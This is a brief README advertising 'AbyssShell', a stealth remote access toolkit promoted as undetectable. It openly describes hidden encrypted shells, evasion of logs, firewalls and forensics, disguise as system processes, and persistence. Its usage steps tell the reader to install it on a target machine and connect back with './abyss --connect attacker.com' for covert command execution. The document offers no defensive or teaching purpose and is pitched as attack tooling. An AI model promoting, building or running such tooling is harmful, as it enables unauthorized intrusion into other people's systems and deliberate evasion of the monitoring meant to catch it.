# AbyssShell  
_An undetectable, stealth remote access toolkit._  

### What It Does:  
- **Creates encrypted remote shells hidden inside normal system traffic**  
- **Avoids logs, firewall detection, and forensic traces**  
- **Disguises execution as legitimate system processes**  
- **Ensures persistence while remaining invisible to monitoring tools**  

### Who Is It For?  
_"A shell that cannot be found  
Is a shell that cannot be closed."_  

### How to Use:  
1. Deploy **AbyssShell** on a target machine:  
   ```bash
   ./abyss --install
2.  Establish a hidden connection back to your system:
 
  ./abyss --connect attacker.com

3.  Execute remote commands while remaining undetected:
 
  ./abyss --shell

4.  Ensure no logs, no traces, and no persistence indicators exist
